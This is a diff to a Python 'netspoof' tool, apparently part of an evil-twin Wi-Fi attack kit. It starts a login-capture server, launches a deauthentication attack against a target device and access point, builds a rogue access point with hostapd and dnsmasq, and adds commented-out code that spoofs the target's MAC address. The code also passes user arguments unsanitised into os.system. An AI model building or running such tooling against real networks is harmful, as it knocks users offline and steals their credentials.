@@ -1,4 +1,5 @@
 import os
+import time
 
 
 class netspoof():
@@ -25,12 +26,11 @@ class netspoof():
     def netspoof(self, var):
         if "-s" and "-a" and "-c" and "-d" and "-b" in var:
             try:
-                # starting deauth attack and login server  
+                # starting deauth attack and login server 
                 os.system("sudo gnome-terminal -x sh -c 'sudo python login_server.py'")
                 cmd = 'sudo python deauth.py ' + var["-d"] + ' ' + var["-b"]
                 os.system("sudo gnome-terminal -x sh -c" + " '" + cmd + "'")
-                self.createAP(var["-s"], var["-a"], var["-c"])
-
+                self.createAP(var["-s"], var["-a"], var["-c"], var["-b"])
             except Exception:
                 error = []
                 error.append("1")
@@ -42,8 +42,13 @@ class netspoof():
             error.append("Error: Need to specifiy network to spoof")
             return error
 
-    def createAP(self, ssid, iface, channel):
+    def createAP(self, ssid, iface, channel, macspoof):
+        #os.system("sudo ifconfig " + iface + " down")
+        #os.system("sudo ifconfig " + iface + " hw ether " + macspoof)
+        #os.system("sudo ifconfig " + iface + " up")
+        #time.sleep(2)
         os.system("sudo ifconfig " + iface + " 10.0.0.1 netmask 255.255.255.0")
+
         # editing config file for ap settings
         ap_confile = open("hostapd.conf", "w")
         config = (
@@ -89,6 +94,8 @@ class netspoof():
             os.system('iptables -X')
             os.system('iptables -t nat -F')
             os.system('iptables -t nat -X')
+            os.system("sudo ifconfig " + iface + " down")
+            os.system("sudo ifconfig " + iface + " up")
             readFile = open("/etc/dnsmasq.conf")
 
             lines = readFile.readlines()
